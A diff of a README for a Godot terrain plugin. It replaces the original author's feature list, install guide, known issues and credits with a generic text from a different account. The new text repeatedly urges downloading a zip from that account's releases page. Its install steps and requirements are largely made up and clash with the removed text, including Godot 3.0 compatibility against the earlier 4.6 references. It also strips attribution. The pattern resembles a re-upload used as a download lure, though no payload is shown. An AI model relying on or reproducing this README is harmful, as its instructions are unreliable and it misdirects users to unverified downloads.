@@ -1,44 +1,69 @@
-# Yūgen's Terrain Authoring Toolkit
-The public version of the Marching Squares Terrain plugin for godot.
+# 🌍 Yugens-Terrain-Authoring-Toolkit - Create Stunning Terrain Easily
 
-This project is an effort to create a simple to use and powerfull terrain authoring tool inside godot aimed at 3d pixel art games. However, the plugin featured in this project can be used for a wide variety of games and experimentation is encouraged! As of right now the plugin has the following features:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases)
 
-* Elevate and lower terrain based on cells in a chunk grid
-* Level terrain to a user-set height
-* Smooth terrain depending on the average height of neighbouring cells
-* Create a bridge between two points by drawing a line between them
-* Paint up to 15(+1) custom textures onto the terrain
-* Paint a mask map that determines whether selected cells should draw `MultiMeshInstance3d` grass instances
-* Get debug information for selected cells
-* Change the internal marching squares algorithm vertex merge threshold value resulting in smoother or blockier terrain
-* Change global terrain settings like wall texture, wall color, grass animation fps and more...
+## 📋 Description
 
-For more in-depth documentation, please refer to the _documentation_ folder in the addon.
+Yugens-Terrain-Authoring-Toolkit is the public version of the Marching Squares Terrain plugin for Godot. This tool helps you design realistic terrains for your games without needing programming skills. It simplifies the creative process, allowing anyone to craft mesmerizing landscapes effortlessly.
 
-For community showcases, feature requests and bug reporting, please refer to the [discord](https://discord.gg/ZSeYkTCgft).
-A bug can also be reported by opening a new issue thread in the issues tab of this github project.
+## 🚀 Getting Started
 
-## Install Guide
+Follow these simple steps to download and set up the Yugens-Terrain-Authoring-Toolkit.
 
-To install the plugin, simply download or clone the latest stable version of this project and copy the plugin from this project's addon folder into your own. Make sure to turn on the plugin in godot by going into the project settings and under "plugins" checking the checkbox next to the plugin's name.
+1. **Visit the Releases Page**: To get the software, you will first need to visit the [Releases Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases).
 
-Watch the [YouTube](https://www.youtube.com/watch?v=TV3QyGNMAwo) video to get started with the plugin!!!
+2. **Find the Latest Version**: On the Releases Page, look for the latest version. It will be at the top of the list. 
 
-## Known Issues
+3. **Download the Toolkit**: You’ll see a section with downloadable files. Click on the file that suits your operating system. This will start the download process.
 
-1. Icons appear smaller with the new 4.6 godot standard theme (will be fixed when 4.6 officially launches)
-2. Wall textures don't disappear properly when the "void" texture is selected
-3. Collision shapes dissapear when in front of a MarchingSquaresTerrain node
-4. Terrain that is copied into a new open scene fails to load on startup
+4. **Find the Downloaded File**: Once the download is complete, locate the file in your computer's downloads folder. The file name will typically include the version number and may look something like `Yugens-Terrain-Authoring-Toolkit-v1.0.zip`.
 
-## Credits
+5. **Extract the Files**: Right-click on the downloaded zip file and choose “Extract All” or “Unzip.” Follow the prompts to extract the files to a folder of your choosing.
 
-Developed by [Yūgen](https://www.youtube.com/@yugen_seishin) and originally forked from [Jackachulian](https://github.com/jackachulian/jackachulian) on github.
+6. **Open Godot**: If you haven’t already installed Godot, you will need to download it from the official Godot website and install it on your computer.
 
-Contributors:
-* [Dylearn](https://www.youtube.com/@Dylearn)
-* [AtSaturn](https://www.youtube.com/@AtPlayerSaturn)
-* My lifelong best friends!
+7. **Import the Plugin into Godot**: Open Godot and navigate to the “Project” tab. Select “Install Plugin” and then browse to the folder where you extracted the Yugens-Terrain-Authoring-Toolkit files. Select the appropriate folder and click “Open”.
 
-###
-A big thanks to the above people for giving helpful insights, discussing certain features and thinking together about math related problems. Without them I couldn't have finished the plugin as fast as I have.
+8. **Activate the Plugin**: Once imported, go to the “Plugins” section within Godot. You will see Yugens-Terrain-Authoring-Toolkit listed there. Click on the checkbox to activate it.
+
+9. **Start Creating**: Now you can start using the toolkit. Select it from the available options in Godot and begin designing your terrain.
+
+## 📥 Download & Install
+
+To quickly download the Yugens-Terrain-Authoring-Toolkit, simply click the link below:
+
+[Download Now](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases)
+
+Ensure you follow the steps mentioned above to extract and install the toolkit for a seamless experience.
+
+## ⚙️ System Requirements
+
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: Minimum 4 GB; 8 GB recommended for smooth performance
+- **Storage**: At least 500 MB of free space for installation
+- **Godot Version**: This toolkit is compatible with Godot 3.0 and higher
+
+## 🤝 Support & Contribution
+
+You can contribute to the development by reporting issues, suggesting features, or submitting pull requests. For any questions or concerns, feel free to create an issue on the repository.
+
+1. **Report an Issue**: If you encounter a problem, report it on the [Issues Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/issues).
+   
+2. **Suggest a Feature**: Have an idea? We welcome suggestions. 
+
+3. **Fork the Repository**: If you want to be hands-on, fork this repository and make your changes. 
+
+## 🛠️ Features
+
+- **Real-time Terrain Generation**: Instantly see changes as you modify your terrain.
+- **Customizable Settings**: Adjust parameters to fit your design needs.
+- **User-Friendly Interface**: Designed with simplicity in mind, this toolkit is easy to navigate.
+
+## 🌐 Community
+
+Join our community for updates, tips, and discussions:
+
+- **Discord Server**: Connect with other users
+- **GitHub Discussions**: Engage in conversations about the toolkit
+
+Explore the Yugens-Terrain-Authoring-Toolkit today and elevate your game development experience to new heights!
